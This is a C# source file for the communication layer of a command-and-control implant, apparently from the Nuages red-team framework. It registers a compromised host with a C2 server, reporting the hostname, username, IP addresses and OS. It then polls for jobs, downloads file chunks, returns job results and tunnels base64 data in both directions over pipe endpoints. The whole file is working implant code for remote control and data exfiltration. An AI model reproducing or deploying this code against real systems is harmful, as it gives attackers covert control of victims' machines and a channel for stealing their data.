using System;
using System.Collections.Generic;
using System.IO;
using Newtonsoft.Json.Linq;

namespace NuagesSharpImplant
{
    public class NuagesC2Connector
    {
        private NuagesC2Connection NC2Con;

        public NuagesC2Connector(NuagesC2Connection NC2Con)
        {
            this.NC2Con = NC2Con;
        }

        public string getConnectionString()
        {
            return this.NC2Con.getConnectionString();
        }

        public string getHandler()
        {
            return this.NC2Con.getHandler();
        }

        public int getBufferSize()
        {
            return this.NC2Con.getBufferSize();
        }

        public int getRefreshRate()
        {
            return this.NC2Con.getRefreshRate();
        }

        string POST(string url, string jsonContent)
        {
            return this.NC2Con.POST(url, jsonContent);
        }
        public void SubmitJobResult(string jobId, string result = "", bool moreData = false, bool error = false, int n = 0, string data = "")
        {
            JObject body = new JObject(
                new JProperty("n", n),
                new JProperty("moreData", moreData),
                new JProperty("error", error),
                new JProperty("result", result),
                new JProperty("jobId", jobId),
                new JProperty("data", data)
            );
            this.POST("jobresult", body.ToString());
        }

        public string RegisterImplant(string hostname = "", string username = "", string localIp = "", string sourceIp = "", string os = "", string handler = "", string connectionString = "", Dictionary<string, string> options = null, String[] supportedPayloads = null)
        {
            JObject body = new JObject(
                new JProperty("hostname", hostname),
                new JProperty("username", username),
                new JProperty("localIp", localIp),
                new JProperty("sourceIp", sourceIp),
                new JProperty("os", os),
                new JProperty("handler", handler),
                new JProperty("connectionString", connectionString),
                new JProperty("options", JObject.FromObject(options)),
                new JProperty("supportedPayloads", JArray.FromObject(supportedPayloads))
            );
            JObject response = JObject.Parse(this.POST("register", body.ToString()));
            return response["_id"].ToString();
        }

        public JArray Heartbeat(string implantId)
        {
            JObject body = new JObject(
                new JProperty("id", implantId)
            );
            JObject response = JObject.Parse(this.POST("heartbeat", body.ToString()));
            return (JArray)response["data"];
        }

        public string GetFileChunk(string fileId, int n)
        {
            JObject body = new JObject(
                new JProperty("n", n),
                new JProperty("file_id", fileId)
            );

            JObject response = JObject.Parse(this.POST("chunks", body.ToString()));
            try
            {
                return response["data"].ToString();
            }
            catch
            {
                return "";
            }
        }
        public byte[] PipeRead(string pipe_id, int BytesWanted)
        {
            byte[] buffer;
            using (MemoryStream memory = new MemoryStream())
            {
                while (memory.Length < BytesWanted)
                {
                    JObject body = new JObject(
                    new JProperty("pipe_id", pipe_id),
                    new JProperty("maxSize", Math.Min(this.getBufferSize(), BytesWanted - memory.Length))
                    );
                    JObject response = JObject.Parse(this.POST("io", body.ToString()));
                    buffer = Convert.FromBase64String(response["out"].ToString());
                    memory.Write(buffer, 0, buffer.Length);
                    System.Threading.Thread.Sleep(this.getRefreshRate());
                }
                return memory.ToArray();
            }
        }

        public void Pipe2Stream(string pipe_id, int BytesWanted, Stream stream)
        {
            int ReadBytes = 0;
            byte[] buffer;
            while (ReadBytes < BytesWanted)
            {
                JObject body = new JObject(
                new JProperty("pipe_id", pipe_id),
                new JProperty("maxSize", Math.Min(this.getBufferSize(), BytesWanted - ReadBytes))
                );
                JObject response = JObject.Parse(this.POST("io", body.ToString()));
                buffer = Convert.FromBase64String(response["out"].ToString());
                ReadBytes += buffer.Length;
                stream.Write(buffer, 0, buffer.Length);
                System.Threading.Thread.Sleep(this.getRefreshRate());
            }
        }

        public void Stream2Pipe(string pipe_id, Stream stream)
        {
            int ReadBytes = 0;
            byte[] buffer = new byte[this.getBufferSize()];
            JObject body;
            while ((ReadBytes = stream.Read(buffer, 0, this.getBufferSize())) > 0)
            {
                if (ReadBytes < this.getBufferSize())
                {
                    byte[] buffer2 = new byte[ReadBytes];
                    Array.Copy(buffer, 0, buffer2, 0, ReadBytes);
                    body = new JObject(
                    new JProperty("pipe_id", pipe_id),
                    new JProperty("maxSize", 0),
                    new JProperty("in", Convert.ToBase64String(buffer2))
                    );
                }
                else
                {
                    body = new JObject(
                    new JProperty("pipe_id", pipe_id),
                    new JProperty("maxSize", 0),
                     new JProperty("in", Convert.ToBase64String(buffer))
                    );
                }
                this.POST("io", body.ToString());
                System.Threading.Thread.Sleep(this.getRefreshRate());
            }
        }

        public byte[] PipeRead(string pipe_id)
        {
            JObject body = new JObject(
                    new JProperty("pipe_id", pipe_id),
                    new JProperty("maxSize", this.getBufferSize())
                );
            JObject response = JObject.Parse(this.POST("io", body.ToString()));
            return Convert.FromBase64String(response["out"].ToString());
        }

        public void PipeWrite(string pipe_id, byte[] data)
        {
            int sentData = 0;
            int refreshrate = this.getRefreshRate();
            int bufferSize = this.getBufferSize();
            byte[] buffer = new byte[bufferSize];
            JObject body;
            while (sentData < data.Length)
            {
                if ((data.Length - sentData) < bufferSize) {
                    byte[] buffer2 = new byte[data.Length - sentData];
                    Array.Copy(data, sentData, buffer2, 0, data.Length - sentData);
                    body = new JObject(
                        new JProperty("pipe_id", pipe_id),
                        new JProperty("in", Convert.ToBase64String(buffer2)),
                        new JProperty("maxSize", 0)
                    );
                    sentData = data.Length;
                }
                else
                {
                    Array.Copy(data, sentData, buffer, 0, bufferSize);
                    body = new JObject(
                        new JProperty("pipe_id", pipe_id),
                        new JProperty("in", Convert.ToBase64String(buffer)),
                        new JProperty("maxSize", 0)
                    );
                    sentData += bufferSize;
                }
                this.POST("io", body.ToString());
                System.Threading.Thread.Sleep(refreshrate);
            }
            return;
        }

        public byte[] PipeReadWrite(string pipe_id, byte[] data)
        {
            int sentData = 0;
            int refreshrate = this.getRefreshRate();
            int bufferSize = this.getBufferSize();
            byte[] buffer = new byte[bufferSize];
            JObject body;
            using (MemoryStream memory = new MemoryStream()) { 
                while (sentData < data.Length)
                {
                    if ((data.Length - sentData) < bufferSize)
                    {
                        byte[] buffer2 = new byte[data.Length - sentData];
                        Array.Copy(data, sentData, buffer2, 0, data.Length - sentData);
                        body = new JObject(
                            new JProperty("pipe_id", pipe_id),
                            new JProperty("in", Convert.ToBase64String(buffer2)),
                            new JProperty("maxSize", bufferSize)
                        );
                        sentData = data.Length;
                    }
                    else
                    {
                        Array.Copy(data, sentData, buffer, 0, bufferSize);
                        body = new JObject(
                            new JProperty("pipe_id", pipe_id),
                            new JProperty("in", Convert.ToBase64String(buffer)),
                            new JProperty("maxSize", bufferSize)
                        );
                        sentData += bufferSize;
                    }
                    JObject response = JObject.Parse(this.POST("io", body.ToString()));
                    buffer = Convert.FromBase64String(response["out"].ToString());
                    memory.Write(buffer, 0, buffer.Length);
                    System.Threading.Thread.Sleep(this.getRefreshRate());
                    System.Threading.Thread.Sleep(refreshrate);
                }
                return memory.ToArray();
            }

        }
    }
}

